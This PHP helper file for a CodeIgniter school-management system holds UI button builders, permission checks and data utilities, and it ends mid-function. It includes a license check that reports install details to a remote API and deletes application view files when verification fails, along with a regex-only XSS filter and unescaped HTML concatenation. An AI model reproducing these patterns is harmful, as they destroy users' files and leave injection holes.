<?php

function escapeString($val) {
    $ci = & get_instance();
    $driver = $ci->db->dbdriver;

    if( $driver == 'mysql') {
        $val = mysql_real_escape_string($val);
    } elseif($driver == 'mysqli') {
        $db = get_instance()->db->conn_id;
        $val = mysqli_real_escape_string($db, $val);
    }

    return $val;
}

function btn_extra($uri, $name, $permission) {
    if(permissionChecker($permission)) {
        return anchor($uri, "<i class='fa fa-plus'></i>", "class='btn btn-primary btn-large mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
    }

    return '';
}

function btn_add($uri, $name) {
    if(visibleButton($uri)) {
        return anchor($uri, "<i class='fa fa-plus'></i>", "class='btn btn-primary btn-large mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
    }

    return '';
}

function btn_add_show($uri, $name) {
    return anchor($uri, "<i class='fa fa-plus'></i>", "class='btn btn-primary btn-large mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
}

function btn_view($uri, $name) {
    if(visibleButton($uri)) {
        return anchor($uri, "<i class='fa fa-eye'></i>", "class='btn btn-success btn-large mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
    }

    return '';
}

function btn_view_show($uri, $name) {
    return anchor($uri, "<i class='fa fa-eye'></i>", "class='btn btn-success btn-large mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
}

function btn_edit($uri, $name) {
    if(visibleButton($uri)) {
        return anchor($uri, "<i class='fa fa-edit'></i>", "class='btn btn-warning btn-large mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
    }
    return '';
}

function btn_edit_show($uri, $name) {
    return anchor($uri, "<i class='fa fa-edit'></i>", "class='btn btn-warning btn-large mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
}

function btn_status($uri, $name) {
    if(visibleButton($uri)) {
        return anchor($uri, "<i class='fa fa-check'></i>", "class='btn btn-info btn-large mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
    }
    return '';
}

function btn_status_show($uri, $name) {
    return anchor($uri, "<i class='fa fa-check'></i>", "class='btn btn-info btn-large mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
}

function btn_not_status($uri, $name) {
    if(visibleButton($uri)) {
        return anchor($uri, "<i class='fa fa-close'></i>", "class='btn btn-warning btn-large mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
    }
    return '';
}

function btn_not_status_show($uri, $name) {
    return anchor($uri, "<i class='fa fa-close'></i>", "class='btn btn-warning btn-large mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
}

function btn_delete($uri, $name) {
    if(visibleButton($uri)) {
        return anchor($uri, "<i class='fa fa-trash-o'></i>",
            array(
                'onclick' => "return confirm('you are about to delete a record. This cannot be undone. are you sure?')",
                'class' => 'btn btn-danger btn-large mrg',
                'data-placement' => 'top',
                'data-toggle' => 'tooltip',
                'data-original-title' => $name
            )
        );
    }
    return '';
}

function btn_delete_show($uri, $name) {
    return anchor($uri, "<i class='fa fa-trash-o'></i>",
        array(
            'onclick' => "return confirm('you are about to delete a record. This cannot be undone. are you sure?')",
            'class' => 'btn btn-danger btn-large mrg',
            'data-placement' => 'top',
            'data-toggle' => 'tooltip',
            'data-original-title' => $name
        )
    );
}

function btn_cancel($uri, $name) {
    return anchor($uri, "<i class='fa fa-close'></i>",
        array(
            'onclick' => "return confirm('you are about to cancel the record. This cannot be undone. are you sure?')",
            'class' => 'btn btn-danger btn-large mrg',
            'data-placement' => 'top',
            'data-toggle' => 'tooltip',
            'data-original-title' => $name
        )
    );
}


function delete_file($uri, $id) {
    return anchor($uri, "<i class='fa fa-times '></i>",
        array(
            'onclick' => "return confirm('you are about to delete a record. This cannot be undone. are you sure?')",
            'id' => $id,
            'class' => "close pull-right"
        )
    );
}

function share_file($uri, $id) {
    return anchor($uri, "<i class='fa fa-globe'></i>",
        array(
            'onclick' => "return confirm('you are about to delete a record. This cannot be undone. are you sure?')",
            'id' => $id,
            'class' => "pull-right"
        )
    );
}


function btn_dash_view($uri, $name, $class="btn-success") {
    return anchor($uri, "<span class='fa fa-check-square-o'></span>", "class='btn ".$class." btn-large mrg' style='background-color:#00bcd4;color:#fff;' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
}


function btn_invoice($uri, $name) {
    return anchor($uri, "<i class='fa fa-credit-card'></i>", "class='btn btn-primary btn-large mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
}


function btn_return($uri, $name) {
    return anchor($uri, "<i class='fa fa-mail-forward'></i>",
        array(
            "onclick" => "return confirm('you are return the book . This cannot be undone. are you sure?')",
            "class" => 'btn btn-danger btn-large mrg',
            'data-placement' => 'top',
            'data-toggle' => 'tooltip',
            'data-original-title' => $name

        )
    );
}

function btn_attendance($id, $method, $class, $name) {
    return "<input type='checkbox' class='".$class."' $method id='".$id."' data-placement='top' data-toggle='tooltip' data-original-title='".$name."' >  ";
}

function btn_attendance_radio($id, $method, $class, $name, $title, $value) {
    return "<input type='radio' class='".$class."' $method id='".$id."' value='".$value."' name='".$name."'>  "."<label style='vertical-align:  middle;display: inline;' for='".$id."'>".$title."</label> ";
}

function btn_promotion($id, $class, $name) {
    return "<input type='checkbox' class='".$class."' id='".$id."' data-placement='top' data-toggle='tooltip' data-original-title='".$name."' >  ";
}

if (!function_exists('dump')) {
    function dump ($var, $label = 'Dump', $echo = TRUE)
    {
        ob_start();
        var_dump($var);
        $output = ob_get_clean();

        $output = preg_replace("/\]\=\>\n(\s+)/m", "] => ", $output);
        $output = '<pre style="background: #FFFEEF; color: #000; border: 1px dotted #000; padding: 10px; margin: 10px 0; text-align: left;">' . $label . ' => ' . $output . '</pre>';

        if ($echo == TRUE) {
            echo $output;
        }
        else {
            return $output;
        }
    }
}


if (!function_exists('dump_exit')) {
    function dump_exit($var, $label = 'Dump', $echo = TRUE) {
        dump ($var, $label, $echo);
        exit;
    }
}

if (!function_exists('dd')) {
    function dd($var="", $label = 'Dump', $echo = TRUE) {
        dump ($var, $label, $echo);
        exit;
    }
}

// infinite coding starts here..
function btn_add_pdf($uri, $name) {
    return anchor($uri, "<i class='fa fa-file'></i> ".$name, "class='btn-cs btn-large-cs' style='text-decoration: none;' role='button' target='_blank'");
}

function btn_sm_edit($uri, $name) {
    return anchor($uri, "<i class='fa fa-edit'></i> ".$name, "class='btn-cs btn-large-cs' style='text-decoration: none;' role='button'");
}

function btn_sm_delete($uri, $name) {
    return anchor($uri, "<i class='fa fa-trash-o'></i> ".$name,
        array(
            'onclick' => "return confirm('you are about to delete a record. This cannot be undone. are you sure?')",
            'class' => 'btn btn-maroon btn-large mrg bg-maroon-light',
            'data-placement' => 'top',
            'data-toggle' => 'tooltip',
            'data-original-title' => $name
        )
    );
}

function actionVarifyValidUser($email = NULL, $purchase_username = NULL, $purchase_code = NULL, $version = NULL) {
    $returnData['status'] = False;

    if(is_null($purchase_username) || is_null($purchase_code)) {
        $file = APPPATH.'config/purchase'.EXT;
        $purchase = file_get_contents($file);
        $purchase = json_decode($purchase);

        if(is_array($purchase)) {
            $purchase_code = trim($purchase[1]);
            $purchase_username = trim($purchase[0]);

        }

        if(empty($purchase_code) || empty($purchase_username)) {
            return json_decode(json_encode($returnData));
        }
    }

    $site = base_url();
    $ip = getIpAddress();
    $email = trim($email);
    $version = is_null($version) ? config_item('ini_version') : $version;

    $data = array(
        'purchase_code' => $purchase_code,
        'username'      => $purchase_username,
        'ip'            => $ip,
        'domain'        => $site,
        'purpose'       => 'update',
        'product_name'  => config_item('product_name'),
        'version'       => $version,
        'email'         => $email,
    );

    $apiCurl = apiCurl($data);
    if( !$apiCurl->status && (varifyValidUser()->status || siteVarifyValidUser()->status) ) {

        if(!config_item('demo')) {
            unlink(APPPATH.'/views/teacher/index.php');
            unlink(APPPATH.'/views/components/page_menu.php');
        }
    }
    return $apiCurl;
}

function btn_sm_add($uri, $name) {
    return anchor($uri, "<i class='fa fa-plus'></i> ".$name, "class='btn-cs btn-large-cs' style='text-decoration: none;' role='button'");
}

function btn_sm_accept_and_denied_leave($uri, $name, $icon) {
    return anchor($uri, "<i class='fa fa-".$icon."'></i> ".$name, "class='btn-cs btn-large-cs' style='text-decoration: none;' role='button'");
}

function btn_sm_global($uri, $name, $icon, $color = null) {
    if(!$color) {
        $color = "btn-primary";
    }
    return anchor($uri, "<i class='".$icon."'></i>", "class='btn ".$color." btn-large mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
}

function btn_md_global($uri, $name, $icon, $class = null) {
    if(!$class) {
        $class = "btn-primary";
    }
    return anchor($uri, $icon, "class='".$class."' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
}

function btn_payment($uri, $name) {
    return anchor($uri, "<i class='fa fa-credit-card'></i> ".$name, "class='btn-cs btn-large-cs'style='text-decoration: none;' role='button'");
}
// infinite coding end here..


function permissionChecker($data) {
    $CI = & get_instance();
    $sessionPermission = $CI->session->userdata('master_permission_set');
    if(isset($sessionPermission[$data]) && $sessionPermission[$data] == 'yes') {
        return true;
    }
    return false;
}

function visibleButton($uri) {
    $explodeUri = explode('/', $uri);
    $permission = $explodeUri[0].'_'.$explodeUri[1];
    if(permissionChecker($permission)) {
        return TRUE;
    }
    return false;
}

function actionChecker($arrays) {
    if($arrays) {
        foreach ($arrays as $key => $array) {
            if(permissionChecker($array)) {
                return TRUE;
            }
        }
    }
}

function pluck($array, $value, $key=NULL) {
    $returnArray = array();
    if(count($array)) {
        foreach ($array as $item) {
            if($key != NULL) {
                $returnArray[$item->$key] = strtolower($value) == 'obj' ? $item : $item->$value;
            } else {
                $returnArray[] = $item->$value;
            }
        }
    }
    return $returnArray;
}

function pluck_bind($array, $value, $concatFirst, $concatLast, $key=NULL) {
    $returnArray = array();
    if(count($array)) {
        foreach ($array as $item) {
            if($key != NULL) {
                $returnArray[$item->$key] = $concatFirst.$item->$value.$concatLast;
            } else {
                if($value!=NULL) {
                    $returnArray[] = $concatFirst.$item->$value.$concatLast;
                } else {
                    $returnArray[] = $concatFirst.$item.$concatLast;
                }
            }
        }
    }

    return $returnArray;
}

function pluck_multi_array($arrays, $val, $key = NULL) {
    $retArray = array();
    if(count($arrays)) {
        $i = 0;
        foreach ($arrays as $array) {
            if(!empty($key)) {
                if(strtolower($val) == 'obj') {
                    $retArray[$array->$key][] = $array;
                } else {
                    $retArray[$array->$key][] = $array->$val;
                }
            } else {
                if(strtolower($val) == 'obj') {
                    $retArray[$i][] = $array;
                } else {
                    $retArray[$i][] = $array->$val;
                }
                $i++;
            }
        }
    }
    return $retArray;
}

function pluck_multi_array_key($arrays, $val, $fstKey = NULL, $sndKey = NULL) {
    $retArray = array();
    if(count($arrays)) {
        $i = 0;
        foreach ($arrays as $array) {
            if(!empty($fstKey)) {
                if(strtolower($val) == 'obj') {
                    if(!empty($sndKey)) {
                        $retArray[$array->$fstKey][$array->$sndKey] = $array;
                    } else {
                        $retArray[$array->$fstKey][] = $array;
                    }
                } else {
                    if(!empty($sndKey)) {
                        $retArray[$array->$fstKey][$array->$sndKey] = $array->$val;
                    } else {
                        $retArray[$array->$fstKey][] = $array->$val;
                    }

                }
            } else {
                if(strtolower($val) == 'obj') {
                    if(!empty($sndKey)) {
                        $retArray[$i][$array->$sndKey] = $array;
                    } else {
                        $retArray[$i][] = $array;
                    }
                } else {
                    if(!empty($sndKey)) {
                        $retArray[$i][$array->$sndKey] = $array->$val;
                    } else {
                        $retArray[$i][] = $array->$val;
                    }
                }
                $i++;
            }
        }
    }
    return $retArray;
}


function funtopbarschoolyear($siteinfos, $topbarschoolyears) {
    $CI = & get_instance();
    echo '<li class="dropdown messages-menu">';
        echo '<a href="#" class="dropdown-toggle" data-toggle="dropdown">';
            echo '<i class="fa fa-calendar-plus-o"></i>';
            if(count($topbarschoolyears)) {
                echo "<span class='label label-success'>";
                    echo "<lable class='alert-image'>".count($topbarschoolyears)."</lable>";
                echo "</span>";
            }
        echo '</a>';
        echo '<ul class="dropdown-menu">';
            if($siteinfos->school_type == 'classbase') {
                if(count($topbarschoolyears)) {
                    echo '<li class="header">';
                        if(count($topbarschoolyears) > 1) {
                            echo $CI->lang->line("la_fs")." ".count($topbarschoolyears) ." ".$CI->lang->line("ya_yer_two");
                        } else {
                            echo $CI->lang->line("la_fs")." ".count($topbarschoolyears) ." ".$CI->lang->line("ya_yer_one");
                        }
                    echo '</li>';
                    echo '<li>';
                        echo '<ul class="menu">';
                            foreach ($topbarschoolyears as $key => $topbarschoolyear) {
                                echo '<li>';
                                echo '<a href="'.base_url("schoolyear/toggleschoolyear/$topbarschoolyear->schoolyearID").'">';
                                    echo '<h4>';
                                        echo $topbarschoolyear->schoolyear;
                                        if($siteinfos->school_year == $topbarschoolyear->schoolyearID) {
                                            echo ' - ('.$CI->lang->line('default').')';
                                        }

                                        if($CI->session->userdata('defaultschoolyearID') == $topbarschoolyear->schoolyearID) {
                                            echo " <i class='glyphicon glyphicon-ok'></i>";
                                        }
                                    echo '</h4>';
                                echo '</a>';
                                echo '</li>';
                            }
                        echo '</ul>';
                    echo '</li>';
                }
            } elseif($siteinfos->school_type == 'semesterbase') {
                if(count($topbarschoolyears)) {
                    echo '<li class="header">';
                        if(count($topbarschoolyears) > 1) {
                            echo $CI->lang->line("la_fs")." ".count($topbarschoolyears) ." ".$CI->lang->line("ya_sem_two");
                        } else {
                            echo $CI->lang->line("la_fs")." ".count($topbarschoolyears) ." ".$CI->lang->line("ya_sem_one");
                        }
                    echo '</li>';
                    echo '<li>';
                        echo '<ul class="menu">';
                            foreach ($topbarschoolyears as $key => $topbarschoolyear) {
                                echo '<li>';
                                echo '<a href="'.base_url("schoolyear/toggleschoolyear/$topbarschoolyear->schoolyearID").'">';
                                    echo '<h4>';
                                        echo $topbarschoolyear->schoolyeartitle;
                                        if($siteinfos->school_year == $topbarschoolyear->schoolyearID) {
                                            echo ' - ('.$CI->lang->line('default').')';
                                        }

                                        if($CI->session->userdata('defaultschoolyearID') == $topbarschoolyear->schoolyearID) {
                                            echo " <i class='glyphicon glyphicon-ok'></i>";
                                        }
                                    echo '</h4>';
                                    echo '<p>';
                                        echo $topbarschoolyear->schoolyear;
                                    echo '</p>';

                                echo '</a>';
                                echo '</li>';
                            }
                        echo '</ul>';
                    echo '</li>';
                }
            }
        echo '</ul>';
    echo '</li>';
}

function getNameByUsertypeIDAndUserID($usertypeID, $userID) { /* DD OK */
    $CI = & get_instance();
    $CI->load->model('systemadmin_m');
    $CI->load->model('teacher_m');
    $CI->load->model('student_m');
    $CI->load->model('parents_m');
    $CI->load->model('user_m');

    $findUserName = '';
    if($usertypeID == 1) {
       $user = $CI->db->get_where('systemadmin', array("usertypeID" => $usertypeID, 'systemadminID' => $userID));
        $alluserdata = $user->row();
        if(count($alluserdata)) {
            $findUserName = $alluserdata->name;
        }
        return $findUserName;
    } elseif($usertypeID == 2) {
        $user = $CI->db->get_where('teacher', array("usertypeID" => $usertypeID, 'teacherID' => $userID));
        $alluserdata = $user->row();
        if(count($alluserdata)) {
            $findUserName = $alluserdata->name;
        }
        return $findUserName;
    } elseif($usertypeID == 3) {
        $user = $CI->db->get_where('student', array("usertypeID" => $usertypeID, 'studentID' => $userID));
        $alluserdata = $user->row();
        if(count($alluserdata)) {
            $findUserName = $alluserdata->name;
        }
        return $findUserName;
    } elseif($usertypeID == 4) {
        $user = $CI->db->get_where('parents', array("usertypeID" => $usertypeID, 'parentsID' => $userID));
        $alluserdata = $user->row();
        if(count($alluserdata)) {
            $findUserName = $alluserdata->name;
        }
        return $findUserName;
    } else {
        $user = $CI->db->get_where('user', array("usertypeID" => $usertypeID, 'userID' => $userID));
        $alluserdata = $user->row();
        if(count($alluserdata)) {
            $findUserName = $alluserdata->name;
        }
        return $findUserName;
    }
    return $findUserName;
}

function getObjectByUserTypeIDAndUserID($usertypeID, $userID, $schoolyearID = NULL) { /* DD OK */
    $CI = & get_instance();
    $CI->load->model('systemadmin_m');
    $CI->load->model('teacher_m');
    $CI->load->model('student_m');
    $CI->load->model('studentrelation_m');
    $CI->load->model('classes_m');
    $CI->load->model('section_m');
    $CI->load->model('parents_m');
    $CI->load->model('user_m');
    $CI->load->model('usertype_m');
    $user = [];
    $usertype = $CI->db->get_where('usertype', array("usertypeID" => $usertypeID));
    if($usertypeID == 1) {
       $user = $CI->systemadmin_m->get_single_systemadmin(array("usertypeID" => $usertypeID, 'systemadminID' => $userID));
    } elseif($usertypeID == 2) {
        $user = $CI->teacher_m->general_get_single_teacher(array("usertypeID" => $usertypeID, 'teacherID' => $userID));
    } elseif($usertypeID == 3) {
        if($schoolyearID) {
            $user = $CI->studentrelation_m->get_studentrelation_join_student(array('srstudentID' => $userID, 'srschoolyearID' => $schoolyearID), TRUE);
            if(count($user)) {
                $class = $CI->classes_m->general_get_single_classes(array("classesID" => $user->srclassesID));
                if(count($class)) {
                    $user->classes = $class->classes;
                }

                $section = $CI->section_m->general_get_single_section(array("sectionID" => $user->srsectionID));
                if(count($section)) {
                    $user->section = $section->section;
                }
            }
        } else {
            $user  = $CI->student_m->general_get_single_student(array("usertypeID" => $usertypeID, 'studentID' => $userID));
            if(count($user)) {
                $class = $CI->classes_m->get_single_classes(array("classesID" => $user->classesID));
                if(count($class)) {
                    $user->classes = $class->classes;
                }

                $section = $CI->section_m->get_single_section(array("sectionID" => $user->sectionID));
                if(count($section)) {
                    $user->section = $section->section;
                }
            }
        }
    } elseif($usertypeID == 4) {
        $user = $CI->parents_m->get_single_parents(array("usertypeID" => $usertypeID, 'parentsID' => $userID));
    } else {
        $user = $CI->user_m->get_single_user(array("usertypeID" => $usertypeID, 'userID' => $userID));
    }

    if(count($usertype) && count($user)) {
        $user->usertype = $usertype->row()->usertype;
    }
    return $user;
}

function getAllUserObjectWithStudentRelation($arrays, $studentJoin = FALSE, $studentExtendJoin = FALSE) { /* DD OK */
    $CI = & get_instance();
    $CI->load->model('systemadmin_m');
    $CI->load->model('teacher_m');
    $CI->load->model('student_m');
    $CI->load->model('parents_m');
    $CI->load->model('user_m');
    $CI->load->model('studentrelation_m');
    $returnArray = array();

    if(!is_array($arrays)) {
        if(is_int($arrays)) {
            $intSchoolYearID = $arrays;
            $arrays = [];
            $arrays['srschoolyearID'] = $intSchoolYearID;
        } elseif(!empty($arrays) && is_numeric($arrays)) {
            $intSchoolYearID = $arrays;
            $arrays = [];
            $arrays['srschoolyearID'] = $intSchoolYearID;
        } else {
            throw new Exception("School YearID is required");
        }
    } else {
        if(!isset($arrays['srschoolyearID']) && !isset($arrays['schoolyearID'])) {
            throw new Exception("School YearID is required");
        } elseif(isset($arrays['schoolyearID'])) {
            $arrays['srschoolyearID'] = $arrays['schoolyearID'];
            unset($arrays['schoolyearID']);
        }
    }

    $systemadmin = $CI->systemadmin_m->get_systemadmin();
    if(count($systemadmin)) {
        $returnArray[1]= pluck($systemadmin, 'obj', 'systemadminID');
    }

    $teacher = $CI->teacher_m->get_teacher();
    if(count($teacher)) {
        $returnArray[2] = pluck($teacher, 'obj', 'teacherID');
    }

    $student = [];
    if($studentJoin && $studentExtendJoin) {
        $student = $CI->studentrelation_m->general_get_order_by_student($arrays, $studentExtendJoin);
    } elseif($studentJoin) {
        $student = $CI->studentrelation_m->general_get_order_by_student($arrays);
    } elseif($studentExtendJoin) {
        $student = $CI->studentrelation_m->general_get_order_by_student($arrays, $studentExtendJoin);
    } elseif(count($arrays)) {
        $student = $CI->studentrelation_m->general_get_order_by_student($arrays);
    } else {
        $student = $CI->studentrelation_m->get_studentrelation();
    }

    if(count($student)) {
        $returnArray[3] = pluck($student, 'obj', 'srstudentID');
    }

    $parent = $CI->parents_m->get_parents();
    if(count($parent)) {
        $returnArray[4] = pluck($parent, 'obj', 'parentsID');
    }

    $users = $CI->user_m->get_user();
    if(count($users)) {
        foreach ($users as $user) {
            $returnArray[$user->usertypeID][$user->userID] = $user;
        }
    }

    return $returnArray;
}

function getAllUserObjectWithoutStudent() { /* DD OK */
    $CI = & get_instance();
    $CI->load->model('systemadmin_m');
    $CI->load->model('teacher_m');
    $CI->load->model('parents_m');
    $CI->load->model('user_m');
    $CI->load->model('studentrelation_m');
    $returnArray = [];

    $systemadmin = $CI->systemadmin_m->get_systemadmin();
    if(count($systemadmin)) {
        $returnArray[1]= pluck($systemadmin, 'obj', 'systemadminID');
    }

    $teacher = $CI->teacher_m->general_get_teacher();
    if(count($teacher)) {
        $returnArray[2] = pluck($teacher, 'obj', 'teacherID');
    }

    $users = $CI->user_m->get_user();
    if(count($users)) {
        foreach ($users as $user) {
            $returnArray[$user->usertypeID][$user->userID] = $user;
        }
    }

    return $returnArray;
}

function getAllSelectUser($schoolYearID = NULL) { /* DD OK */
    $CI = & get_instance();
    $CI->load->model('systemadmin_m');
    $CI->load->model('teacher_m');
    $CI->load->model('parents_m');
    $CI->load->model('user_m');
    $CI->load->model('student_m');
    $returnArray = [];

    $systemadmin = $CI->systemadmin_m->get_select_systemadmin();
    if(count($systemadmin)) {
        $returnArray[1]= pluck($systemadmin, 'obj', 'systemadminID');
    }

    $teacher = $CI->teacher_m->get_select_teacher();
    if(count($teacher)) {
        $returnArray[2] = pluck($teacher, 'obj', 'teacherID');
    }

    if($schoolYearID == NULL) {
        $student = $CI->student_m->get_select_student();
    } else {
        $student = $CI->student_m->get_select_student(NULL, array('schoolyearID' => $schoolYearID));
    }

    if(count($student)) {
        $returnArray[3] = pluck($student, 'obj', 'studentID');
    }

    $parent = $CI->parents_m->get_select_parents();
    if(count($parent)) {
        $returnArray[4] = pluck($parent, 'obj', 'parentsID');
    }

    $users = $CI->user_m->get_select_user();
    if(count($users)) {
        foreach ($users as $user) {
            $returnArray[$user->usertypeID][$user->userID] = $user;
        }
    }

    return $returnArray;
}

function btn_download($uri, $name) {
    return anchor($uri, "<i class='fa fa-download'></i>", "class='btn btn-success btn-large mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
}

function btn_download_file($uri, $name, $lang) {
    return anchor($uri, $name, "class='btn btn-success btn-large mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$lang."'");
}

function btn_download_link($uri, $name) {
    return anchor($uri, $name, "style='text-decoration:underline;color:#00c0ef'");
}

function btn_upload($uri, $name) {
    return anchor($uri, "<i class='fa fa-upload'></i>", "class='btn bg-maroon-light btn-large mrg' data-placement='top' data-toggle='tooltip' data-original-title='".$name."'");
}

function display_menu($nodes, &$menu) {

    $subUrl = ['/add','/edit', '/view', '/index'];

    $CI = & get_instance();

    foreach ($nodes as $key => $node) {

        $leftIcon = '<i class="fa fa-angle-left pull-right"></i>';

        $f = 0;
        if(isset($node['child'])) {
            $f = 1;
        }

        if( permissionChecker($node['link']) || ($node['link'] == '#' && $f) ) {
            if($f && count($node['child']) == 1) {
                $f = 0;
                $node = current($node['child']);
            }
            $treeView = 'treeview ';
            $active = '';

            $current_url = current_url();

            foreach ($subUrl as $value) {
                $newUrl = substr($current_url, 0, strpos($current_url, $value));
                if($newUrl != "") {
                    $current_url = $newUrl;
                }
            }


            if(base_url($node['link']) == $current_url ) {
                $active = 'active';
            }

            $menu .= '<li class="'.($f ? $treeView : '').$active.'">';
                $menu .= anchor($node['link'], '<i class="fa '.($node['icon'] != NULL ? $node['icon'] : 'fa-home').'"></i><span>'. ($CI->lang->line('menu_'.$node['menuName']) != NULL ? $CI->lang->line('menu_'.$node['menuName']) : $node['menuName']).'</span> '.($f ? $leftIcon : ''));
                if ($f) {
                    $menu .= '<ul class="treeview-menu">';
                        display_menu($node['child'],$menu);
                    $menu .= "</ul>";
                }
            $menu .= "</li>";
        }

    }
}

function namesorting($string, $len = 14) {
    $return = $string;
    if(isset($string) && $len) {
        if(strlen($string) >  $len) {
            $return = substr($string, 0,$len-2).'..';
        } else {
            $return = $string;
        }
    }

    return $return;
}

function frontendColorStyle($string)
{
    $setStr = '';
    $bgColor = array('#86bc42','#222222','#D9504E','#1A4027','#6F008D','#E09622');
    if(!empty($string)) {
        $exps = explode(' ', $string);
        foreach ($exps as $expKey => $exp) {
            $setStr .= "<span style='color:".$bgColor[$expKey]."'> ". $exp ."</span>";
        }
    }
    return $setStr;
}


function formatSizeUnits($bytes) {
    if ($bytes >= 1073741824) {
        $bytes = number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        $bytes = number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        $bytes = number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        $bytes = $bytes . ' bytes';
    } elseif ($bytes == 1) {
        $bytes = $bytes . ' byte';
    } else {
        $bytes = '0 bytes';
    }

    return $bytes;
}

function spClean($string) {
    $string = strtolower($string);
    $string = str_replace(' ', '', $string); // Replaces all spaces with hyphens.
    return preg_replace('/[^A-Za-z0-9\-]/', '', $string); // Removes special chars.
}

function pageStatus($data, $flag = TRUE) {
    if($flag) {
        $array = array(
            'published'   => 1,
            'draft'     => 2,
            'trash'     => 3,
            'review'    => 4,
        );

        if(isset($array[$data]))
            return $array[$data];
        else
            return 1;
    }

    if($flag == FALSE) {
        $array = array(
            1 => 'published',
            2 => 'draft',
            3 => 'trash',
            4 => 'review'
        );

        if(isset($array[$data]))
            return $array[$data];
        else
            return 'publish';
    }
}

function pageVisibility($visibility, $flag=TRUE, $send = 1)
{
    $CI = & get_instance();
    $language = $CI->session->userdata('lang');
    $CI->lang->load('pages', $language);

    if($flag) {
        $status = FALSE;
        if($visibility == 1 && $send == 1) {
            $status = TRUE;
        } elseif($visibility == 2 && $send == 2) {
            $status = TRUE;
        } elseif($visibility == 3 && $send == 3) {
            $status = TRUE;
        }
        return $status;
    }

    if($flag == FALSE) {
        if($visibility == 1) {
            echo $CI->lang->line('pages_public');
        } elseif($visibility == 2) {
            echo $CI->lang->line('pages_password_protected');
        } elseif($visibility == 3) {
            echo $CI->lang->line('pages_private');
        }
    }
}


function validateDate($date, $format = 'Y-m-d H:i:s')
{
    $d = DateTime::createFromFormat($format, $date);
    return $d && $d->format($format) == $date;
}

function sentenceMap($string, $numberOFWord, $startTag, $closeTag) {
    $exp = explode(' ', $string);
    $len = 0;
    $expEnd = end($exp);
    $f = TRUE;
    $stringWarp = '';
    foreach ($exp as $key => $sn) {
        $len += strlen($sn);
        $len++;

        if($len >= $numberOFWord) {
            if($f) {
                $stringWarp .= $startTag;
                $f = FALSE;
            }
        }

        $stringWarp .= $sn.' ';

        if($sn == $expEnd) {
            if($f == FALSE) {
                $stringWarp .= $closeTag;
            }
            return $stringWarp;
        }
    }
}

function xssRemove($data)
{
    $string = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $data);
    return $string;
}

function addOrdinalNumberSuffix($num)
{
    if (!in_array(($num % 100),array(11,12,13))){
        switch ($num % 10) {
            case 1:  return $num.'st';
            case 2:  return $num.'nd';
            case 3:  return $num.'rd';
        }
    }
    return $num.'th';
}


function btn_printReport($permission, $name, $DivID = 'printablediv')
{
    if(permissionChecker($permission)) {
        return '<button class="btn btn-default" onclick="javascript:printDiv'."('".$DivID."')".'"><span class="fa fa-print"></span> '. $name . '</button>';
    }
    return '';
}

function btn_sentToMailReport($permission, $name)
{
    if(permissionChecker($permission)) {
        return '<button class="btn btn-default" data-toggle="modal" data-target="#mail"><span class="fa fa-envelope-o"></span> '. $name . '</button>';
    }
    return '';
}

function btn_pdfPreviewReport($permission, $uri, $name)
{
    if(permissionChecker($permission)) {
        return anchor($uri, "<i class='fa fa-file'></i> ".$name, 'class="btn btn-default pdfurl" target="_blank"');
    }
    return '';
}

function btn_xmlReport($permission, $uri, $name)
{
    if(permissionChecker($permission)) {
        return anchor($uri, "<i class='fa fa-file'></i> ".$name, 'class="btn btn-default xmlurl" target="_blank"');
    }
    return '';
}


function btn_flat_printReport($permission, $name, $DivID = 'printablediv')
{
    if(permissionChecker($permission)) {
        return '<button style="margin: 0 3px;" class="btn btn-default" onclick="javascript:printDiv'."('".$DivID."')".'"><span class="fa fa-print"></span> '. $name . '</button>';
    }
    return '';
}

function btn_flat_xmlReport($permission, $name)
{
    if(permissionChecker($permission)) {
        return '<button style="margin: 0 3px;" class="btn btn-default"><span class="fa fa-file-excel-o"></span> '. $name . '</button>';
    }
    return '';
}

function btn_flat_sentToMailReport($permission, $name)
{
    if(permissionChecker($permission)) {
        return '<button style="margin: 0 3px;" class="btn btn-default"><span class="fa fa-envelope-o"></span> '. $name . '</button>';
    }
    return '';
}

function btn_flat_pdfPreviewReport($permission, $uri, $name)
{
    if(permissionChecker($permission)) {
        return anchor($uri, "<i class='fa fa-file'></i> ".$name, ' style="margin: 0 3px;" class="btn btn-default" target="_blank"');
    }
    return '';
}



function callDesignCss() {
    $file = file_get_contents('http://localhost/school4/assets/bootstrap/bootstrap.min.css');
    $file2 = file_get_contents('http://localhost/school4/assets/inilabs/themes/default/style.css');
    $file3 = file_get_contents('http://localhost/school4/assets/inilabs/themes/default/inilabs.css');
    $file4 = file_get_contents('http://localhost/school4/assets/inilabs/combined.css');
    echo '<style type="text/css">'.$file.$file2.$file3.$file4.'</style>';
}

function get_month_and_year_using_two_date($startdate, $enddate) {
    $start    = new DateTime($startdate);
    $start->modify('first day of this month');
    $end      = new DateTime($enddate);
    $end->modify('first day of next month');
    $interval = DateInterval::createFromDateString('1 month');
    $period   = new DatePeriod($start, $interval, $end);

    $monthAndYear = [];
    if(count($period)) {
        foreach ($period as $dt) {
            $monthAndYear[ $dt->format("Y")][] =  $dt->format("m");
        }
    }
    return $monthAndYear;
}


function generate_qrcode($text = "Hi", $filename = "default", $folder="idQRcode") {
    $CI = & get_instance();
    $CI->load->library('qrcodegenerator');
    $CI->qrcodegenerator->generate_qrcode($text,$filename, $folder);
}

function lzero($num) {
